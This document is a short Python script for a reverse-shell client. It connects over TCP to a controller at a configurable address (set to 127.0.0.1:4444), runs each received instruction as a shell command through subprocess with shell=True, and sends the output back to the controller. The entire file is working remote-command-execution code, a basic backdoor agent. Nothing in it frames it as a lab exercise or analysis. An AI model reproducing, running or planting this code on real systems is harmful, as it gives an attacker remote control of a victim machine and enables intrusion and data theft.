import socket
import subprocess
import os

HOST_IP = "127.0.0.1"
HOST_PORT = 4444

def session_handler():
    print(f"[+] Connecting to {HOST_IP}...")
    sock.connect((HOST_IP, HOST_PORT))
    print(f"[+] Connected to {HOST_IP}.")
    while True:
        try:
            message = sock.recv(1024).decode()
            print(f"[+] Instruction recieved --> {message}")
            # case for handling exit command 
            if message == "exit":
                print("[-] The server has terminated this session.")
                sock.close()
                print("[-] Connection closed.")
                break
            # case for handling cd command
            elif message.split(" ")[0] == "cd":
                # cd without any arguments just prints the current directory
                if len(message.split(" ")) == 1:
                    cur_dir = os.getcwd()
                    sock.send(cur_dir.encode())
                else:
                    directory = str(message.split(" ")[1])
                    try: 
                        os.chdir(directory)
                        cur_dir = os.getcwd()
                        print(f"[+] Changed directory to {cur_dir}.")
                        sock.send(cur_dir.encode())
                    except Exception:
                        sock.send("Failed to change directory.".encode())
            # case for handling commands without arguments
            else:
                # encoding="oem" is for Windows encoding, remove parameter otherwise
                command = subprocess.Popen(message, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, encoding="oem")
                output = command.stdout.read() + command.stderr.read()
                print(output.encode())
                print(type(output))
                sock.send(output.encode())
        except KeyboardInterrupt:
            print("Keyboard interrupt issued.")
            sock.close()
            print("[-] Connection closed.")
            break
        except Exception:
            sock.close()
            break

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
session_handler()